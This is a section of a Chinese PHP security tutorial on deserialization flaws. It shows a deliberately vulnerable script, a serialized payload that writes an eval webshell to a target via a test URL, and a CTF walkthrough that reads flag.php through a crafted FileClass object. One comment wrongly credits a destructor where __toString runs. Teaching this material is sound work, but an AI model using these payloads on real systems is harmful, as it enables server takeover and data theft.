### 3.12、反序列化漏洞

**问题函数**

解析反序列化内容的时候执行了序列化后的代码。

```
unserialize();

```

**漏洞代码**

```
<?php 
error_reporting(0); 
if(empty($_GET['code'])) die(show_source(__FILE__)); 
class example 
{ 
    var $var='123'; 

    function __destruct(){ 
        $fb = fopen('./php.php','w'); 
        fwrite($fb, $this->var); 
        fclose($fb); 
    } 
} 

$class = $_GET['code']; 
$class_unser = unserialize($class); 
unset($class_unser); 
?> 
```

写一个php的脚本，执行得到一串序列化后字符串，生成的代码是不会在浏览器直接显示的，需要查看源码才能看到完整内容。
```
<?php
class example
{
    var $var='<?php @eval($_POST[pass]);?>';//一句话木马
}
$a=new example();//顶替原来的example，从而执行destruct函数,所以名称还是要写成example
echo serialize($a);//输出序列化后的结果
?>

```

**测试方法**


```
http://218.2.197.236:26225/?code=O:7:"example":1:{s:3:"var";s:31:"<?php @eval($_REQUEST[pass]);?>";}
```

**Xman 反序列化题目**

**漏洞代码：**
```

hint: flag.php<?php
if(empty($_GET['code'])){
exit('?code=');
}
class FileClass{
    public $filename = 'error.log';

    public function __toString(){
        return file_get_contents($this->filename);
    }
}
class User{
    public $age = 0;  
    public $name = '';  

    public function __toString()  
    {  
        return 'User ' . $this->name . ' is ' . $this->age . ' years old. <br />';  
    }  
}
echo "hint: flag.php";
$obj = unserialize($_GET['code']);
echo $obj;
?>  
  
```

### **测试方法**

根据题目code传参，得到flag.php，访问后得到的help.php提示了段代码，根据提示的代码构造反序列化代码：
```
<?php

class FileClass{ 
    public $filename = 'flag.php'; 
    public function __toString(){
         return file_get_contents($this->filename); 
        } 
    } 

$a=new FileClass();//顶替原来的FileClass，从而执行destruct函数,所以名称还是要写成FileClass
echo serialize($a);//输出序列化后的结果

?>
```
生成反序列化
```
O:9:"FileClass":1:{s:8:"filename";s:8:"flag.php";}
```
传参后，右键查看源码拿到flag.php：
```
http://218.2.197.236:28835/index.php?code=O:9:"FileClass":1:{s:8:"filename";s:8:"flag.php";}
```
